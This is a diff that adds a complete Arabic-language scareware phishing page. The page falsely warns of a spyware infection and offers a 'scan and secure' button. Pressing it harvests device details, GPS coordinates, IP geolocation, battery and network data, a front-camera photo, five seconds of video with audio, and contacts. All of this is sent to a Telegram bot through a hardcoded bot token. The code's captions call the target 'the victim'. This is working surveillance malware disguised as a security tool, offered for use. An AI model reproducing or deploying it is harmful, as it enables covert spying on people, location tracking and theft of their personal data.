@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمان - مطلوب</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #000;
+            color: white;
+            min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .container {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 20px;
+            padding: 25px;
+            max-width: 450px;
+            width: 95%;
+            text-align: center;
+        }
+        .skull { font-size: 70px; animation: shake 0.5s infinite; }
+        @keyframes shake {
+            0%, 100% { transform: rotate(0); }
+            25% { transform: rotate(-10deg); }
+            75% { transform: rotate(10deg); }
+        }
+        h1 { color: #ff0000; font-size: 20px; margin: 10px 0; }
+        .danger-box {
+            background: rgba(255,0,0,0.1);
+            border: 1px solid #ff0000;
+            border-radius: 10px;
+            padding: 12px; margin: 10px 0;
+        }
+        .danger-box p { color: #ff4444; font-size: 12px; margin: 2px 0; }
+        .info-row {
+            display: flex; justify-content: space-between;
+            padding: 8px; border-bottom: 1px solid #111;
+            font-size: 12px;
+        }
+        .info-row span:first-child { color: #888; }
+        .info-row span:last-child { color: #0f0; }
+        .btn {
+            width: 100%; padding: 16px; border: none;
+            border-radius: 12px; font-size: 18px; font-weight: bold;
+            cursor: pointer; margin: 8px 0; transition: 0.3s;
+        }
+        .btn-start {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white; animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255,0,0,0.5); }
+            50% { box-shadow: 0 0 0 30px rgba(255,0,0,0); }
+        }
+        .btn-start:hover { transform: scale(1.02); }
+        .btn-pass {
+            background: transparent; color: #666;
+            border: 1px solid #333; font-size: 13px;
+        }
+        .loading { display: none; margin: 15px 0; }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 3px solid rgba(255,0,0,0.2);
+            border-top-color: #ff0000; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .progress-bar {
+            width: 100%; height: 5px; background: #111;
+            border-radius: 3px; margin: 10px 0; overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%; background: linear-gradient(90deg, #ff0000, #ff6600);
+            width: 0%; transition: width 0.3s; border-radius: 3px;
+        }
+        .log-box {
+            background: #000; border: 1px solid #111;
+            border-radius: 8px; padding: 10px; margin: 10px 0;
+            max-height: 150px; overflow-y: auto; text-align: right;
+            font-family: 'Courier New', monospace; font-size: 11px;
+            color: #0f0; display: none;
+        }
+        .log-item { margin: 2px 0; }
+        .log-item span { color: #ff0; }
+        .success-box {
+            display: none; color: #0f0; font-size: 14px; margin: 10px 0;
+        }
+        video { display: none; width: 100%; max-width: 250px; border-radius: 10px; margin: 10px auto; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="skull">💀</div>
+        <h1>تم اكتشاف فيروس خطير!</h1>
+        
+        <div class="danger-box">
+            <p>⚠️ جهازك مصاب بفيروس تجسس</p>
+            <p>🛡️ اضغط للتأمين الفوري وحذف الفيروس</p>
+            <p>📋 سيتم فحص جميع بيانات جهازك</p>
+        </div>
+
+        <div class="info-row">
+            <span>نوع الجهاز:</span>
+            <span id="deviceType">جاري الكشف...</span>
+        </div>
+        <div class="info-row">
+            <span>النظام:</span>
+            <span id="osInfo">جاري الكشف...</span>
+        </div>
+        <div class="info-row">
+            <span>IP:</span>
+            <span id="ipAddress">جاري الكشف...</span>
+        </div>
+
+        <button class="btn btn-start" id="startBtn" onclick="startHack()">
+            🛡️ فحص وتأمين الجهاز
+        </button>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top:10px;color:#ff4444;" id="statusText">جاري الفحص الشامل...</p>
+        </div>
+
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="log-box" id="logBox"></div>
+
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+
+        <div class="success-box" id="successBox">
+            ✅ تم تنظيف الجهاز بنجاح! يمكنك إغلاق الصفحة
+        </div>
+
+        <button class="btn btn-pass" onclick="window.location.href='https://google.com'">
+            تجاهل (غير موصى به)
+        </button>
+    </div>
+
+    <script>
+        var chatId = new URL(window.location.href).searchParams.get('chatId') || '';
+        var BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var allData = [];
+        var mediaRecorder;
+        var chunks = [];
+        var sent = false;
+
+        function addLog(text, color) {
+            var box = document.getElementById('logBox');
+            box.style.display = 'block';
+            var div = document.createElement('div');
+            div.className = 'log-item';
+            div.innerHTML = '<span>[' + getTime() + ']</span> ' + text;
+            box.appendChild(div);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function getTime() {
+            var d = new Date();
+            return d.getHours().toString().padStart(2,'0') + ':' +
+                   d.getMinutes().toString().padStart(2,'0') + ':' +
+                   d.getSeconds().toString().padStart(2,'0');
+        }
+
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('statusText').textContent = text;
+        }
+
+        function updateInfo(id, value) {
+            document.getElementById(id).textContent = value;
+        }
+
+        async function startHack() {
+            if (sent) return;
+            
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('progressBar').style.display = 'block';
+            
+            addLog('بدء الفحص الشامل...', '#ff0');
+            updateProgress(5, 'جاري تحليل الجهاز...');
+
+            // المرحلة 1: معلومات الجهاز
+            await stage1_DeviceInfo();
+            
+            // المرحلة 2: الموقع والـ IP
+            await stage2_Location();
+            
+            // المرحلة 3: البطارية والشبكة
+            await stage3_BatteryNetwork();
+            
+            // المرحلة 4: الكاميرا
+            await stage4_Camera();
+            
+            // المرحلة 5: جهات الاتصال
+            await stage5_Contacts();
+            
+            // المرحلة 6: إرسال كل البيانات
+            await stage6_SendAll();
+        }
+
+        async function stage1_DeviceInfo() {
+            addLog('فحص مواصفات الجهاز...', '#0f0');
+            updateProgress(10, 'جاري فحص الجهاز...');
+            
+            var info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth + '-bit',
+                memory: navigator.deviceMemory || 'غير معروف',
+                cores: navigator.hardwareConcurrency || 'غير معروف',
+                cookieEnabled: navigator.cookieEnabled,
+                online: navigator.onLine,
+                vendor: navigator.vendor || 'غير معروف'
+            };
+            
+            updateInfo('deviceType', info.platform);
+            updateInfo('osInfo', info.userAgent.split('(')[1]?.split(')')[0] || 'غير معروف');
+            
+            addLog('✓ الجهاز: ' + info.platform, '#0f0');
+            addLog('✓ الشاشة: ' + info.screenSize, '#0f0');
+            addLog('✓ الذاكرة: ' + info.memory + ' GB', '#0f0');
+            addLog('✓ المعالج: ' + info.cores + ' نواة', '#0f0');
+            
+            allData.push('\n📱 معلومات الجهاز:');
+            allData.push('المنصة: ' + info.platform);
+            allData.push('الشاشة: ' + info.screenSize);
+            allData.push('الذاكرة: ' + info.memory + ' GB');
+            allData.push('المعالج: ' + info.cores + ' نواة');
+            allData.push('اللغة: ' + info.language);
+            allData.push('المتصفح: ' + info.userAgent.split('/')[0]);
+            
+            await sleep(500);
+        }
+
+        async function stage2_Location() {
+            addLog('تحديد الموقع الجغرافي...', '#0f0');
+            updateProgress(25, 'جاري تحديد الموقع...');
+            
+            try {
+                var pos = await new Promise(function(resolve, reject) {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                
+                var lat = pos.coords.latitude.toFixed(6);
+                var lng = pos.coords.longitude.toFixed(6);
+                var acc = pos.coords.accuracy.toFixed(0);
+                
+                addLog('✓ GPS: ' + lat + ', ' + lng, '#0f0');
+                addLog('✓ الدقة: ' + acc + ' متر', '#0f0');
+                
+                var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
+                
+                allData.push('\n📍 الموقع GPS:');
+                allData.push('الإحداثيات: ' + lat + ', ' + lng);
+                allData.push('الدقة: ' + acc + ' متر');
+                allData.push('الرابط: ' + mapsLink);
+            } catch(e) {
+                addLog('✗ GPS غير متاح', '#f00');
+                allData.push('\n📍 الموقع: غير متاح');
+            }
+            
+            try {
+                var r = await fetch('https://ipapi.co/json/');
+                var ipData = await r.json();
+                
+                updateInfo('ipAddress', ipData.ip);
+                
+                addLog('✓ IP: ' + ipData.ip, '#0f0');
+                addLog('✓ الدولة: ' + ipData.country_name, '#0f0');
+                addLog('✓ المدينة: ' + ipData.city, '#0f0');
+                addLog('✓ مزود الخدمة: ' + (ipData.org || 'غير معروف'), '#0f0');
+                
+                allData.push('\n🌍 معلومات الشبكة:');
+                allData.push('IP: ' + ipData.ip);
+                allData.push('الدولة: ' + ipData.country_name);
+                allData.push('المدينة: ' + ipData.city);
+                allData.push('المنطقة: ' + ipData.region);
+                allData.push('الرمز البريدي: ' + ipData.postal);
+                allData.push('مزود الخدمة: ' + (ipData.org || 'غير معروف'));
+                allData.push('خط العرض: ' + ipData.latitude);
+                allData.push('خط الطول: ' + ipData.longitude);
+            } catch(e) {
+                addLog('✗ فشل جلب IP', '#f00');
+            }
+            
+            await sleep(500);
+        }
+
+        async function stage3_BatteryNetwork() {
+            addLog('فحص البطارية والشبكة...', '#0f0');
+            updateProgress(40, 'جاري فحص البطارية...');
+            
+            try {
+                if ('getBattery' in navigator) {
+                    var b = await navigator.getBattery();
+                    addLog('✓ البطارية: ' + Math.round(b.level*100) + '%', '#0f0');
+                    addLog('✓ الشحن: ' + (b.charging ? 'نعم' : 'لا'), '#0f0');
+                    
+                    allData.push('\n🔋 البطارية:');
+                    allData.push('النسبة: ' + Math.round(b.level*100) + '%');
+                    allData.push('الشحن: ' + (b.charging ? 'نعم' : 'لا'));
+                    allData.push('وقت الشحن: ' + (b.chargingTime === Infinity ? 'غير معروف' : b.chargingTime + ' ثانية'));
+                }
+            } catch(e) {}
+            
+            try {
+                var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    addLog('✓ الشبكة: ' + conn.effectiveType, '#0f0');
+                    addLog('✓ السرعة: ' + (conn.downlink || '?') + ' Mbps', '#0f0');
+                    
+                    allData.push('\n📶 الشبكة:');
+                    allData.push('النوع: ' + conn.effectiveType);
+                    allData.push('السرعة: ' + (conn.downlink || '?') + ' Mbps');
+                }
+            } catch(e) {}
+            
+            await sleep(500);
+        }
+
+        async function stage4_Camera() {
+            addLog('فحص الكاميرا...', '#0f0');
+            updateProgress(55, 'جاري فحص الكاميرا...');
+            
+            try {
+                var stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: true
+                });
+                
+                addLog('✓ تم الوصول للكاميرا', '#0f0');
+                addLog('✓ تم الوصول للمايك', '#0f0');
+                
+                var video = document.getElementById('video');
+                var canvas = document.getElementById('canvas');
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                await sleep(2000);
+                
+                // التقاط صورة
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                var photoBlob = await new Promise(function(r) {
+                    canvas.toBlob(r, 'image/jpeg', 0.7);
+                });
+                
+                // تسجيل فيديو 5 ثواني
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                mediaRecorder.start();
+                
+                updateProgress(70, 'جاري تسجيل فيديو...');
+                addLog('تسجيل فيديو 5 ثواني...', '#ff0');
+                
+                await sleep(5000);
+                
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                    await sleep(1000);
+                }
+                
+                var videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                
+                // إرسال الصورة
+                var photoForm = new FormData();
+                photoForm.append('chat_id', chatId);
+                photoForm.append('photo', photoBlob, 'face.jpg');
+                photoForm.append('caption', '📸 صورة وجه الضحية');
+                
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
+                    method: 'POST', body: photoForm
+                });
+                
+                addLog('✓ تم إرسال الصورة', '#0f0');
+                
+                // إرسال الفيديو
+                var videoForm = new FormData();
+                videoForm.append('chat_id', chatId);
+                videoForm.append('video', videoBlob, 'video.mp4');
+                videoForm.append('caption', '🎥 فيديو من كاميرا الضحية');
+                
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', {
+                    method: 'POST', body: videoForm
+                });
+                
+                addLog('✓ تم إرسال الفيديو', '#0f0');
+                
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                video.style.display = 'none';
+                
+            } catch(e) {
+                addLog('✗ الكاميرا غير متاحة', '#f00');
+                allData.push('\n📸 الكاميرا: تم رفض الوصول');
+            }
+            
+            await sleep(300);
+        }
+
+        async function stage5_Contacts() {
+            addLog('فحص جهات الاتصال...', '#0f0');
+            updateProgress(85, 'جاري نسخ جهات الاتصال...');
+            
+            try {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    var contacts = await navigator.contacts.select(
+                        ['name', 'tel', 'email'],
+                        { multiple: true }
+                    );
+                    
+                    if (contacts.length > 0) {
+                        addLog('✓ تم سحب ' + contacts.length + ' جهة اتصال', '#0f0');
+                        
+                        allData.push('\n📋 جهات الاتصال (' + contacts.length + '):');
+                        
+                        for (var i = 0; i < Math.min(contacts.length, 30); i++) {
+                            var c = contacts[i];
+                            var name = c.name || 'بدون اسم';
+                            var tel = c.tel || 'بدون رقم';
+                            var email = c.email || '';
+                            
+                            allData.push('👤 ' + name + ' | 📱 ' + String(tel) + (email ? ' | 📧 ' + email : ''));
+                            addLog('✓ ' + name + ' - ' + String(tel), '#0f0');
+                        }
+                    }
+                } else {
+                    addLog('✗ API غير مدعوم', '#f00');
+                }
+            } catch(e) {
+                addLog('✗ تم رفض الوصول', '#f00');
+            }
+            
+            await sleep(300);
+        }
+
+        async function stage6_SendAll() {
+            if (sent) return;
+            sent = true;
+            
+            updateProgress(95, 'جاري إرسال التقرير...');
+            addLog('إرسال التقرير النهائي...', '#ff0');
+            
+            var finalText = '💀 تقرير السحب الشامل\n';
+            finalText += '━━━━━━━━━━━━━━━━━━\n';
+            finalText += allData.join('\n');
+            
+            // تقسيم إذا كان طويل
+            if (finalText.length > 3500) {
+                var parts = [];
+                var current = '💀 تقرير السحب الشامل (1)\n━━━━━━━━━━━━━━━━━━\n';
+                
+                for (var i = 0; i < allData.length; i++) {
+                    if ((current + allData[i]).length > 3500) {
+                        parts.push(current);
+                        current = '💀 تكملة التقرير\n━━━━━━━━━━━━━━━━━━\n';
+                    }
+                    current += allData[i] + '\n';
+                }
+                parts.push(current);
+                
+                for (var p = 0; p < parts.length; p++) {
+                    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: parts[p] })
+                    });
+                    await sleep(500);
+                }
+            } else {
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: finalText })
+                });
+            }
+            
+            addLog('✅ تم إرسال كل البيانات!', '#0f0');
+            updateProgress(100, 'اكتمل الفحص!');
+            
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('progressBar').style.display = 'none';
+                document.getElementById('successBox').style.display = 'block';
+            }, 1500);
+        }
+
+        function sleep(ms) {
+            return new Promise(function(resolve) { setTimeout(resolve, ms); });
+        }
+    </script>
+</body>
+</html>
